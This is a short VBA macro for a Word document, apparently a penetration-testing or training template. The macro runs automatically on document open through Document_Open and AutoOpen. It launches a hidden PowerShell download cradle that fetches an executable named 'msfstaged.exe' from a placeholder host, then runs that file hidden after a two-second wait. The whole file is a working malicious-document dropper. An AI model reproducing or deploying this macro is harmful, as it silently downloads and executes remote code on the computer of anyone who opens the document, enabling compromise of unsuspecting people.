'this vbs script need to be tested in world 
Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub

'create powershell download cradle
Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://ip/msfstaged.exe','msfstaged.exe')"
	Shell str, vbHide
	Dim exePath As String
	exePath = ActiveDocument.Path + "\msfstaged.exe"
	Wait (2)
	Shell exePath, vbHide
End Sub

'wait function 
Sub Wait(n As Long)
	Dim t As Date
	t = Now
	Do
		DoEvents
	Loop Until Now >= DateAdd("s", n, t)
End Sub